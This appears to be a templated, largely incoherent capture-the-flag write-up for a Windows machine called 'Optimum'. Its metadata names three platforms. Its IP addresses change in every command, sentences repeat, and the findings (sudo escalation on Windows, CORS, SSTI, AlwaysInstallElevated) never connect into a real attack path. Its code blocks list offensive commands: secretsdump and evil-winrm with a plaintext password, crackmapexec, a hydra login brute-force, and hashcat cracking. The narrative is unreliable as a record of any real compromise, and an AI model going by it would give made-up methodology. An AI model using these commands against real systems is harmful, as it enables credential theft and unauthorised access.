---
TitleSEO: "VulnHub — Optimum (Medium Windows) | ZureFX"
TitlePost: "VulnHub — Optimum (Medium Windows)"
Author: "ZureFX"
Description: "Full writeup for VulnHub Optimum. Unconstrained Delegation and CORS Misconfiguration to achieve medium compromise on Windows."
Keywords: "windows, medium, tryhackme"
URL: "https://zurefx.github.io/writeups/htb-optimum-101.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-optimum-101/"
Date: "2024-04-09"
Tags: "Windows, Medium, TryHackMe"
Section: "writeups"
Lang: "en"
main_img: "htb-optimum-101"
Permalink: "/writeups/htb-optimum-101.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Optimum** is rated **Medium** on VulnHub. It runs **Windows** and the IP address during this analysis was `10.14.111.139`.

### Objectives

The service account had excessive permissions assigned in Active Directory. The scheduled task ran with elevated privileges and could be abused for escalation.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
nmap -sCV -p143,5985,3268 10.122.134.209 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.76.51.241
evil-winrm -i 10.113.82.209 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.89.173.230
```

The application stored sensitive credentials in an unencrypted configuration file. The web application was vulnerable to Server-Side Template Injection (SSTI).

### Service Enumeration

Group Policy Preferences contained encrypted but recoverable credentials. Command injection was possible through unsanitized user input in the search functionality. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.109.152.117/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.106.199.11/FUZZ
crackmapexec smb 10.116.120.164 -u administrator -p 'P@ssw0rd!' --shares
crackmapexec smb 10.93.173.210 -u administrator -p 'P@ssw0rd!' --shares
```

Post-exploitation enumeration revealed a path to domain administrator privileges. Post-exploitation enumeration revealed a path to domain administrator privileges.

### SMB Enumeration

Weak file permissions allowed modification of critical system files. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.118.161.21
```

Unconstrained delegation was enabled on the compromised machine. The kernel version was outdated and vulnerable to a publicly known exploit. The application stored sensitive credentials in an unencrypted configuration file.

## Exploitation

### Vulnerability Identification

The service account had excessive permissions assigned in Active Directory. Token impersonation allowed elevation to SYSTEM privileges on the target. Token impersonation allowed elevation to SYSTEM privileges on the target.

Key finding: **CORS Misconfiguration**.

The backup files contained sensitive information that should not have been accessible. The kernel version was outdated and vulnerable to a publicly known exploit.

### Initial Access

The web application was vulnerable to Server-Side Template Injection (SSTI). Weak file permissions allowed modification of critical system files.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.29.142.174/FUZZ
```

Privilege escalation was possible due to misconfigured sudo permissions. Command injection was possible through unsanitized user input in the search functionality. Unconstrained delegation was enabled on the compromised machine.

## Privilege Escalation

### Enumeration

The kernel version was outdated and vulnerable to a publicly known exploit. The service was running without proper input validation, leading to injection vulnerabilities. The database credentials were hardcoded in the application source code.

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p3268,464,995 10.38.118.228 -oN scan.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### Exploitation

The backup files contained sensitive information that should not have been accessible. Authentication bypass was achieved through careful manipulation of the login mechanism.

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.96.156.124/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.21.231.48 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Group Policy Preferences contained encrypted but recoverable credentials. The database credentials were hardcoded in the application source code.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The database credentials were hardcoded in the application source code. Unconstrained delegation was enabled on the compromised machine.

## Summary

### Tools Used

- `wmiexec`
- `rpcclient`
- `bloodhound`
- `psexec`
- `hydra`

### Key Takeaways

- Unconstrained Delegation
- CORS Misconfiguration
- AlwaysInstallElevated
- Weak Service Permissions
